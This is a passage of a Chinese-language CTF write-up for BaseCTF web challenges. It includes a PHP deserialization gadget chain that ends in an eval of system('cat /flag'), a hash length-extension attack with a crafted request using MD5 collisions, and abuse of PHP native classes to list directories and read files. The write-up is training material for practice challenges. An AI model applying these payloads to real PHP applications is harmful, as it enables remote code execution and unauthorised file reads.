class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Sink</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'echo 123;'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">setPrivateVar</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span> <span class="token operator">=</span> <span class="token variable">$res</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Shark</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$word</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'Hello, World!'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">setPrivateVar</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">word</span> <span class="token operator">=</span> <span class="token variable">$res</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Shark says:'</span> <span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">word</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Sea</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$animal</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$sea_ani</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">animal</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'In a deep deep sea, there is a '</span> <span class="token operator">.</span> <span class="token variable">$sea_ani</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Nature</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$sea</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">sea</span><span class="token operator">-></span><span class="token property">see</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$Sink</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Sink</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$Nature</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Nature</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$Sea</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Sea</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$Shark</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Shark</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$Sink</span><span class="token operator">-></span><span class="token function">setPrivateVar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"system('cat /flag');"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$Nature</span><span class="token operator">-></span><span class="token property">sea</span> <span class="token operator">=</span> <span class="token variable">$Sea</span><span class="token punctuation">;</span><span class="token variable">$Sea</span><span class="token operator">-></span><span class="token property">animal</span> <span class="token operator">=</span> <span class="token variable">$Shark</span><span class="token punctuation">;</span><span class="token variable">$Shark</span><span class="token operator">-></span><span class="token function">setPrivateVar</span><span class="token punctuation">(</span><span class="token variable">$Sink</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$Nature</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$res</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发过去的序列化内容要在私有类的类名和属性名前加<code>\x00</code>，最终发送<code>nature=O:6:&quot;Nature&quot;:1:&#123;s:3:&quot;sea&quot;;O:3:&quot;Sea&quot;:1:&#123;s:6:&quot;animal&quot;;O:5:&quot;Shark&quot;:1:&#123;s:11:&quot;%00Shark%00word&quot;;O:4:&quot;Sink&quot;:1:&#123;s:9:&quot;%00Sink%00cmd&quot;;s:20:&quot;system(&#39;cat /flag&#39;);&quot;;&#125;&#125;&#125;&#125;</code></p><p>关于非公有字段名称:</p><ul><li><code>private</code> 使用: 私有的类的名称 (考虑到继承的情况) 和字段名组合 <code>\x00类名称\x00字段名</code></li><li><code>protected</code> 使用: <code>*</code> 和字段名组合 <code>\x00*\x00字段名</code></li></ul><h2 id="数学大师"><a href="#数学大师" class="headerlink" title="数学大师"></a>数学大师</h2><p>从网页利用正则获取算数式然后post加answer参数发过去，需要开启session cookie</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> re<span class="token keyword">def</span> <span class="token function">extract_and_calculate</span><span class="token punctuation">(</span>expression<span class="token punctuation">)</span><span class="token punctuation">:</span>    pattern <span class="token operator">=</span> <span class="token string">r'(\d+)\s*([+\-*/÷×]+)\s*(\d+)'</span>    <span class="token keyword">match</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span> expression<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">match</span><span class="token punctuation">:</span>        num1<span class="token punctuation">,</span> operator<span class="token punctuation">,</span> num2 <span class="token operator">=</span> <span class="token keyword">match</span><span class="token punctuation">.</span>groups<span class="token punctuation">(</span><span class="token punctuation">)</span>        operator <span class="token operator">=</span> operator<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'÷'</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'×'</span><span class="token punctuation">,</span> <span class="token string">'*'</span><span class="token punctuation">)</span>        python_expression <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>num1<span class="token punctuation">&#125;</span></span><span class="token string"> </span><span class="token interpolation"><span class="token punctuation">&#123;</span>operator<span class="token punctuation">&#125;</span></span><span class="token string"> </span><span class="token interpolation"><span class="token punctuation">&#123;</span>num2<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            result <span class="token operator">=</span> <span class="token builtin">eval</span><span class="token punctuation">(</span>python_expression<span class="token punctuation">)</span>            <span class="token keyword">return</span> result        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"Error in calculation: </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"No valid expression found."</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>url <span class="token operator">=</span> <span class="token string">'http://challenge.basectf.fun:29707'</span>response <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>extract_and_calculate<span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">)</span>    post_data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">'answer'</span><span class="token punctuation">:</span> res    <span class="token punctuation">&#125;</span>    response <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>post_data<span class="token punctuation">)</span><span class="token punctuation">.</span>text    <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="所以你说你懂md5？"><a href="#所以你说你懂md5？" class="headerlink" title="所以你说你懂md5？"></a>所以你说你懂md5？</h2><p>利用<code>hash-ext-attack</code>工具进行哈希长度扩展</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">python3 hash_ext_attack<span class="token punctuation">.</span>py<span class="token number">2024</span><span class="token operator">-</span><span class="token number">09</span><span class="token operator">-</span><span class="token number">10</span> <span class="token number">20</span><span class="token punctuation">:</span><span class="token number">53</span><span class="token punctuation">:</span><span class="token number">46.493</span> <span class="token operator">|</span> DEBUG    <span class="token operator">|</span> common<span class="token punctuation">.</span>md5_manual<span class="token punctuation">:</span>__init__<span class="token punctuation">:</span><span class="token number">17</span> <span class="token operator">-</span> init<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>请输入已知明文：请输入已知<span class="token builtin">hash</span>： 82cb3db8069266aecdc0d3cdabb4b460 请输入扩展字符<span class="token punctuation">:</span> admin请输入密钥长度：<span class="token number">96</span><span class="token number">2024</span><span class="token operator">-</span><span class="token number">09</span><span class="token operator">-</span><span class="token number">10</span> <span class="token number">20</span><span class="token punctuation">:</span><span class="token number">53</span><span class="token punctuation">:</span><span class="token number">52.093</span> <span class="token operator">|</span> INFO     <span class="token operator">|</span> common<span class="token punctuation">.</span>HashExtAttack<span class="token punctuation">:</span>run<span class="token punctuation">:</span><span class="token number">65</span> <span class="token operator">-</span> 已知明文：<span class="token string">b''</span><span class="token number">2024</span><span class="token operator">-</span><span class="token number">09</span><span class="token operator">-</span><span class="token number">10</span> <span class="token number">20</span><span class="token punctuation">:</span><span class="token number">53</span><span class="token punctuation">:</span><span class="token number">52.093</span> <span class="token operator">|</span> INFO     <span class="token operator">|</span> common<span class="token punctuation">.</span>HashExtAttack<span class="token punctuation">:</span>run<span class="token punctuation">:</span><span class="token number">66</span> <span class="token operator">-</span> 已知<span class="token builtin">hash</span>：<span class="token string">b'82cb3db8069266aecdc0d3cdabb4b460'</span><span class="token number">2024</span><span class="token operator">-</span><span class="token number">09</span><span class="token operator">-</span><span class="token number">10</span> <span class="token number">20</span><span class="token punctuation">:</span><span class="token number">53</span><span class="token punctuation">:</span><span class="token number">52.093</span> <span class="token operator">|</span> INFO     <span class="token operator">|</span> common<span class="token punctuation">.</span>HashExtAttack<span class="token punctuation">:</span>run<span class="token punctuation">:</span><span class="token number">68</span> <span class="token operator">-</span> 新明文：<span class="token string">b'\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00admin'</span><span class="token number">2024</span><span class="token operator">-</span><span class="token number">09</span><span class="token operator">-</span><span class="token number">10</span> <span class="token number">20</span><span class="token punctuation">:</span><span class="token number">53</span><span class="token punctuation">:</span><span class="token number">52.093</span> <span class="token operator">|</span> INFO     <span class="token operator">|</span> common<span class="token punctuation">.</span>HashExtAttack<span class="token punctuation">:</span>run<span class="token punctuation">:</span><span class="token number">69</span> <span class="token operator">-</span> 新明文<span class="token punctuation">(</span>url编码<span class="token punctuation">)</span>：<span class="token operator">%</span><span class="token number">80</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">03</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span>00admin<span class="token number">2024</span><span class="token operator">-</span><span class="token number">09</span><span class="token operator">-</span><span class="token number">10</span> <span class="token number">20</span><span class="token punctuation">:</span><span class="token number">53</span><span class="token punctuation">:</span><span class="token number">52.093</span> <span class="token operator">|</span> INFO     <span class="token operator">|</span> common<span class="token punctuation">.</span>HashExtAttack<span class="token punctuation">:</span>run<span class="token punctuation">:</span><span class="token number">71</span> <span class="token operator">-</span> 新<span class="token builtin">hash</span><span class="token punctuation">:</span>e7e7b8375abc6096501a68bbd0e3f662<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发送http内容</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">POST <span class="token operator">/</span> HTTP<span class="token operator">/</span><span class="token number">1.1</span>Host<span class="token punctuation">:</span> challenge<span class="token punctuation">.</span>basectf<span class="token punctuation">.</span>fun<span class="token punctuation">:</span><span class="token number">49521</span>Upgrade<span class="token operator">-</span>Insecure<span class="token operator">-</span>Requests<span class="token punctuation">:</span> <span class="token number">1</span>User<span class="token operator">-</span>Agent<span class="token punctuation">:</span> Mozilla<span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span>Windows NT <span class="token number">10.0</span><span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">)</span> AppleWebKit<span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> like Gecko<span class="token punctuation">)</span> Chrome<span class="token operator">/</span><span class="token number">119.0</span><span class="token number">.6045</span><span class="token number">.159</span> Safari<span class="token operator">/</span><span class="token number">537.36</span>Cookie<span class="token punctuation">:</span>PHPSESSID<span class="token operator">=</span>1gtcjs8kgqmltafgpn6cncugfvAccept<span class="token punctuation">:</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>avif<span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>image<span class="token operator">/</span>apng<span class="token punctuation">,</span><span class="token operator">*</span><span class="token operator">/</span><span class="token operator">*</span><span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.8</span><span class="token punctuation">,</span>application<span class="token operator">/</span>signed<span class="token operator">-</span>exchange<span class="token punctuation">;</span>v<span class="token operator">=</span>b3<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.7</span>Accept<span class="token operator">-</span>Encoding<span class="token punctuation">:</span> gzip<span class="token punctuation">,</span> deflate<span class="token punctuation">,</span> brAccept<span class="token operator">-</span>Language<span class="token punctuation">:</span> zh<span class="token operator">-</span>CN<span class="token punctuation">,</span>zh<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span>Content<span class="token operator">-</span>Type<span class="token punctuation">:</span> application<span class="token operator">/</span>x<span class="token operator">-</span>www<span class="token operator">-</span>form<span class="token operator">-</span>urlencodedConnection<span class="token punctuation">:</span> closeContent<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">522</span>apple<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">24</span><span class="token operator">&amp;</span>banana<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">2</span><span class="token operator">&amp;</span>appple<span class="token operator">=</span><span class="token number">240610708</span><span class="token operator">&amp;</span>bananana<span class="token operator">=</span>QNKCDZO<span class="token operator">&amp;</span>banananana<span class="token operator">=</span>M<span class="token operator">%</span>C9h<span class="token operator">%</span>FF<span class="token operator">%</span>0E<span class="token operator">%</span>E3<span class="token operator">%</span>5C<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span>95r<span class="token operator">%</span>D4w<span class="token operator">%</span>7Br<span class="token operator">%</span><span class="token number">15</span><span class="token operator">%</span><span class="token number">87</span><span class="token operator">%</span>D3o<span class="token operator">%</span>A7<span class="token operator">%</span>B2<span class="token operator">%</span>1B<span class="token operator">%</span>DCV<span class="token operator">%</span>B7J<span class="token operator">%</span>3D<span class="token operator">%</span>C0x<span class="token operator">%</span>3E<span class="token operator">%</span>7B<span class="token operator">%</span><span class="token number">95</span><span class="token operator">%</span><span class="token number">18</span><span class="token operator">%</span>AF<span class="token operator">%</span>BF<span class="token operator">%</span>A2<span class="token operator">%</span><span class="token number">02</span><span class="token operator">%</span>A8<span class="token operator">%</span>28K<span class="token operator">%</span>F3n<span class="token operator">%</span>8EKU<span class="token operator">%</span>B3_Bu<span class="token operator">%</span><span class="token number">93</span><span class="token operator">%</span>D8Igm<span class="token operator">%</span>A0<span class="token operator">%</span>D1<span class="token operator">%</span>D5<span class="token operator">%</span>5D<span class="token operator">%</span><span class="token number">83</span><span class="token operator">%</span><span class="token number">60</span><span class="token operator">%</span>FB_<span class="token operator">%</span><span class="token number">07</span><span class="token operator">%</span>FE<span class="token operator">%</span>A2<span class="token operator">&amp;</span>apppple<span class="token operator">=</span>M<span class="token operator">%</span>C9h<span class="token operator">%</span>FF<span class="token operator">%</span>0E<span class="token operator">%</span>E3<span class="token operator">%</span>5C<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span>95r<span class="token operator">%</span>D4w<span class="token operator">%</span>7Br<span class="token operator">%</span><span class="token number">15</span><span class="token operator">%</span><span class="token number">87</span><span class="token operator">%</span>D3o<span class="token operator">%</span>A7<span class="token operator">%</span>B2<span class="token operator">%</span>1B<span class="token operator">%</span>DCV<span class="token operator">%</span>B7J<span class="token operator">%</span>3D<span class="token operator">%</span>C0x<span class="token operator">%</span>3E<span class="token operator">%</span>7B<span class="token operator">%</span><span class="token number">95</span><span class="token operator">%</span><span class="token number">18</span><span class="token operator">%</span>AF<span class="token operator">%</span>BF<span class="token operator">%</span>A2<span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span>A8<span class="token operator">%</span>28K<span class="token operator">%</span>F3n<span class="token operator">%</span>8EKU<span class="token operator">%</span>B3_Bu<span class="token operator">%</span><span class="token number">93</span><span class="token operator">%</span>D8Igm<span class="token operator">%</span>A0<span class="token operator">%</span>D1U<span class="token operator">%</span>5D<span class="token operator">%</span><span class="token number">83</span><span class="token operator">%</span><span class="token number">60</span><span class="token operator">%</span>FB_<span class="token operator">%</span><span class="token number">07</span><span class="token operator">%</span>FE<span class="token operator">%</span>A2<span class="token operator">&amp;</span>name<span class="token operator">=</span><span class="token operator">%</span><span class="token number">80</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">03</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span>00admin<span class="token operator">&amp;</span>md5<span class="token operator">=</span>e7e7b8375abc6096501a68bbd0e3f662<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="flag直接读取不就行了？"><a href="#flag直接读取不就行了？" class="headerlink" title="flag直接读取不就行了？"></a>flag直接读取不就行了？</h2><p><code>php</code>原生类的利用</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment"># 我把flag藏在一个secret文件夹里面了，所以要学会遍历啊~</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$J1ng</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'J'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$Hong</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'H'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$Keng</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'K'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$Wang</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'W'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token variable">$Keng</span><span class="token punctuation">(</span><span class="token variable">$Wang</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$dir</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$f</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token keyword">new</span> <span class="token variable">$J1ng</span><span class="token punctuation">(</span><span class="token variable">$Hong</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>访问<code>http://challenge.basectf.fun:27459/?K=DirectoryIterator&amp;W=/</code>，发现根目录下有<code>secret</code>，访问<code>http://challenge.basectf.fun:27459/?K=DirectoryIterator&amp;W=/secret</code>发现<code>f11444g.php</code>，发送<code>post</code>请求</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">J</span><span class="token operator">=</span>SplFileObject<span class="token operator">&amp;</span><span class="token constant">H</span><span class="token operator">=</span><span class="token operator">/</span>secret<span class="token operator">/</span>f11444g<span class="token operator">.</span>php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>网页看不到，直接查看源代码</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>code</span><span class="token punctuation">></span></span>.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>..<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>f11444g.php<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token prolog">&lt;?php BaseCTF&#123;640a9b0d-3b98-4d44-8164-a1113b9ec49f&#125; ?></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="滤个不停"><a href="#滤个不停" class="headerlink" title="滤个不停"></a>滤个不停</h2><p>文件</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$incompetent</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'incompetent'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$Datch</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Datch'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$incompetent</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'HelloWorld'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'写出程序员的第一行问候吧！'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//这是个什么东东？？？</span><span class="token variable">$required_chars</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'s'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'e'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'v'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'a'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'n'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'x'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'r'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'o'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$is_valid</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$required_chars</span> <span class="token keyword">as</span> <span class="token variable">$char</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$Datch</span><span class="token punctuation">,</span> <span class="token variable">$char</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$is_valid</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token 